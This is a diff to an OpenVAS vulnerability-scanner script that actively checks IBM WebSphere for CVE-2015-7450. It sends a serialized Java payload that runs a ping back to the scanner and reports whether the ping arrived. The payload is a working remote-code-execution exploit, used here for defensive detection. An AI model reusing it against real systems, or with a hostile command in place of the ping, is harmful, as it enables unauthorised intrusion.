@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_ibm_websphere_77653.nasl 9397 2018-04-09 06:01:56Z cfischer $
+# $Id: gb_ibm_websphere_77653.nasl 12449 2018-11-21 07:50:18Z cfischer $
 #
 # IBM WebSphere Application Server Remote Code Execution Vulnerability (Active Check)
 #
@@ -29,47 +29,48 @@ CPE = 'cpe:/a:ibm:websphere_application_server';
 
 if (description)
 {
- script_oid("1.3.6.1.4.1.25623.1.0.105835");
- script_bugtraq_id(77653);
- script_cve_id("CVE-2015-7450");
- script_tag(name:"cvss_base", value:"10.0");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
+  script_oid("1.3.6.1.4.1.25623.1.0.105835");
+  script_bugtraq_id(77653);
+  script_cve_id("CVE-2015-7450");
+  script_tag(name:"cvss_base", value:"10.0");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
+  script_version("$Revision: 12449 $");
+  script_name("IBM WebSphere Application Server Remote Code Execution Vulnerability (Active Check)");
+  script_tag(name:"last_modification", value:"$Date: 2018-11-21 08:50:18 +0100 (Wed, 21 Nov 2018) $");
+  script_tag(name:"creation_date", value:"2016-07-29 15:54:10 +0200 (Fri, 29 Jul 2016)");
+  script_category(ACT_ATTACK);
+  script_family("Web application abuses");
+  script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
+  script_dependencies("gb_ibm_websphere_detect.nasl", "os_detection.nasl");
+  script_require_ports("Services/www", 80, 8880);
+  script_exclude_keys("Settings/disable_cgi_scanning");
 
- script_version ("$Revision: 9397 $");
+  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/77653");
+  script_xref(name:"URL", value:"https://www-01.ibm.com/support/docview.wss?uid=swg21970575");
+  script_xref(name:"URL", value:"http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/");
 
- script_name("IBM WebSphere Application Server Remote Code Execution Vulnerability (Active Check)");
+  script_tag(name:"impact", value:"Successfully exploiting this issue allows attackers to execute arbitrary code in the context of the affected application.");
 
- script_xref(name:"URL", value:"http://www.securityfocus.com/bid/77653");
- script_xref(name:"URL", value:"https://www-01.ibm.com/support/docview.wss?uid=swg21970575");
- script_xref(name:"URL", value:"http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/");
+  script_tag(name:"vuldetect", value:"Send a serialized object which execute a ping against the scanner.");
 
- script_tag(name: "impact" , value:"Successfully exploiting this issue allows attackers to execute arbitrary code in the context of the affected application.");
- script_tag(name: "vuldetect" , value:"Send a serialized object which execute a ping against the scanner");
- script_tag(name: "solution" , value:"Updates are available. Please see the references or vendor advisory for more information.");
- script_tag(name: "summary" , value:"IBM WebSphere Application Server is prone to remote code-execution vulnerability.");
- script_tag(name: "affected" , value:"
-Version 8.5 and 8.5.5 Full Profile and Liberty Profile
-Version 8.0
-Version 7.0");
+  script_tag(name:"solution", value:"Updates are available. Please see the references or vendor advisory for more information.");
 
- script_tag(name:"solution_type", value: "VendorFix");
+  script_tag(name:"summary", value:"IBM WebSphere Application Server is prone to remote code-execution vulnerability.");
 
- script_tag(name:"qod_type", value:"remote_active");
+  script_tag(name:"affected", value:"Version 8.5 and 8.5.5 Full Profile and Liberty Profile
 
- script_tag(name:"last_modification", value:"$Date: 2018-04-09 08:01:56 +0200 (Mon, 09 Apr 2018) $");
- script_tag(name:"creation_date", value:"2016-07-29 15:54:10 +0200 (Fri, 29 Jul 2016)");
- script_category(ACT_ATTACK);
- script_family("Web application abuses");
- script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
- script_dependencies("gb_ibm_websphere_detect.nasl", "os_detection.nasl");
- script_require_ports("Services/www", 80, 8880);
- script_exclude_keys("Settings/disable_cgi_scanning");
+  Version 8.0
 
- exit(0);
+  Version 7.0");
+
+  script_tag(name:"solution_type", value:"VendorFix");
+  script_tag(name:"qod_type", value:"remote_active");
+
+  exit(0);
 }
 
 include("http_func.inc");
-include("http_keepalive.inc");
+
 include("misc_func.inc");
 include("host_details.inc");
 include("dump.inc");
@@ -154,13 +155,16 @@ payload = raw_string(
 0x6c,0x61,0x6e,0x67,0x2e,0x53,0x74,0x72,0x69,0x6e,0x67,0x3b,0xad,0xd2,0x56,0xe7,
 0xe9,0x1d,0x7b,0x47,0x02,0x00,0x00,0x78,0x70,0x00,0x00,0x00,0x01,0x74,0x00);
 
-if( host_runs("Windows") == "yes" )
-{
+vtstrings = get_vt_strings();
+check = vtstrings["ping_string"];
+pattern = hexstr( check );
+
+if( host_runs("Windows") == "yes" ) {
   cmd = 'ping -c 5 ' + this_host();
   win = TRUE;
+} else {
+  cmd = 'ping -c 5 -p ' + pattern + ' ' + this_host();
 }
-else
-  cmd = 'ping -c 5 -p 5f5f4f70656e5641535f5f ' + this_host();
 
 len = raw_string( strlen( cmd ) );
 
@@ -207,7 +211,7 @@ res = send_capture( socket:soc,
 
 close( soc );
 
-if( res && ( win || "__OpenVAS__" >< res ) )
+if( res && ( win || check >< res ) )
 {
   report = 'By sending a special crafted serialized java object it was possible to execute `' + cmd  + '` on the remote host\nReceived answer:\n\n' + hexdump( ddata:( res ) );
   security_message( port:port, data:report );
@@ -215,4 +219,3 @@ if( res && ( win || "__OpenVAS__" >< res ) )
 }
 
 exit( 0 );
-
